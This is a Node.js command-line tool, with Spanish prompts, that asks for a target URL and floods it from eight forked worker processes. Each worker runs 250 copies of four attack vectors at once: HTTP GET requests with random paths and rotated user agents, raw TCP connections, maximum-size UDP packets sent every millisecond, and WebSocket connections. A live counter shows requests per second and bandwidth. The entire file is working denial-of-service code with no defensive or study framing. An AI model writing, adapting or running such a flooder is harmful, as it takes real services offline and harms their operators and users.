#!/usr/bin/env node
'use strict';

const { URL } = require('url');
const cluster = require('cluster');
const net = require('net');
const dgram = require('dgram');
const http = require('http');
const https = require('https');
const http2 = require('http2');
const WebSocket = require('ws');
const { performance } = require('perf_hooks');
const readline = require('readline');
const chalk = require('chalk');
const { randomBytes, randomFillSync } = require('crypto');

class StellarCore {
    constructor() {
        this.stats = {
            total: 0,
            success: 0,
            failed: 0,
            startTime: 0,
            bandwidth: 0
        };
        
        this.config = {
            workers: 8,
            threadsPerWorker: 250,
            attackDuration: 300,
            timeout: 1500
        };
        
        this.payloads = {
            http: Buffer.alloc(4096, 'X'),
            tcp: this.generateTcpPayload(),
            udp: Buffer.alloc(65507, 'Z'),
            ws: Buffer.alloc(2048, 'W')
        };
        
        this.userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Mozilla/5.0 (X11; Linux x86_64)',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X)',
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
        ];
    }

    generateTcpPayload() {
        const buf = Buffer.alloc(1024);
        randomFillSync(buf);
        return buf;
    }

    initializeAttack(target) {
        if (cluster.isMaster) {
            console.log(chalk.greenBright(`\n[+] Iniciando ataque con ${this.config.workers} núcleos`));
            this.stats.startTime = performance.now();
            
            for (let i = 0; i < this.config.workers; i++) {
                cluster.fork().send({ target, config: this.config });
            }
            
            this.displayStats();
        } else {
            process.on('message', ({ target, config }) => {
                this.executeVectors(target, config);
            });
        }
    }

    executeVectors(target, config) {
        const url = new URL(target);
        const vectors = [
            () => this.httpFlood(url),
            () => this.tcpStorm(url),
            () => this.udpBarrage(url),
            () => this.wsTsunami(url)
        ];

        for (let i = 0; i < config.threadsPerWorker; i++) {
            vectors.forEach(vec => vec());
        }
    }

    httpFlood(url) {
        const protocol = url.protocol === 'https:' ? https : http;
        const agent = new protocol.Agent({ keepAlive: true, maxSockets: Infinity });
        
        const attack = () => {
            const req = protocol.request({
                hostname: url.hostname,
                port: url.port || (url.protocol === 'https:' ? 443 : 80),
                path: `/?${randomBytes(8).toString('hex')}`,
                method: 'GET',
                agent: agent,
                headers: {
                    'User-Agent': this.userAgents[Math.random() * this.userAgents.length | 0],
                    'Accept-Encoding': 'gzip, deflate, br'
                }
            });
            
            req.on('response', res => {
                res.on('data', data => this.stats.bandwidth += data.length);
                res.on('end', () => this.updateStats(true));
            }).on('error', () => this.updateStats(false));
            
            req.setTimeout(this.config.timeout, () => req.destroy());
            req.end();
        };
        
        setInterval(attack, 10);
    }

    tcpStorm(url) {
        const attack = () => {
            const socket = new net.Socket();
            socket.connect(url.port || 80, url.hostname, () => {
                socket.write(this.payloads.tcp);
                this.updateStats(true);
                socket.destroy();
            }).on('error', () => this.updateStats(false));
        };
        
        setInterval(attack, 5);
    }

    udpBarrage(url) {
        const socket = dgram.createSocket('udp4');
        socket.on('error', () => {});
        
        setInterval(() => {
            socket.send(this.payloads.udp, url.port || 80, url.hostname, 
                (err) => err ? this.updateStats(false) : this.updateStats(true));
        }, 1);
    }

    wsTsunami(url) {
        const wsUrl = url.origin.replace(/^http/, 'ws');
        
        setInterval(() => {
            const ws = new WebSocket(wsUrl);
            ws.on('open', () => {
                ws.send(this.payloads.ws);
                this.updateStats(true);
                ws.close();
            }).on('error', () => this.updateStats(false));
        }, 50);
    }

    updateStats(success) {
        this.stats.total++;
        success ? this.stats.success++ : this.stats.failed++;
    }

    displayStats() {
        const elapsed = (performance.now() - this.stats.startTime) / 1000;
        const rps = (this.stats.total / elapsed).toFixed(0);
        const bw = (this.stats.bandwidth / 1024 / 1024).toFixed(2);
        
        process.stdout.write(chalk`\r{greenBright [⚡]} ` +
            `Tiempo: {greenBright ${elapsed.toFixed(1)}s} ` +
            `Solicitudes: {cyan ${this.stats.total}} ` +
            `SPS: {cyan ${rps}} ` +
            `BW: {cyan ${bw}MB} ` +
            `({green ${this.stats.success}}|{red ${this.stats.failed}})`
        );
        
        setTimeout(() => this.displayStats(), 500);
    }

    stop() {
        console.log(chalk`\n\n{yellow [!] Deteniendo ataque...}`);
        cluster.disconnect();
        process.exit(0);
    }
}

// Interfaz de usuario
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

console.clear();
rl.question(chalk.greenBright('[?] URL objetivo: '), target => {
    const core = new StellarCore();
    core.initializeAttack(target);
    
    process.on('SIGINT', () => core.stop());
    setTimeout(() => core.stop(), core.config.attackDuration * 1000);
});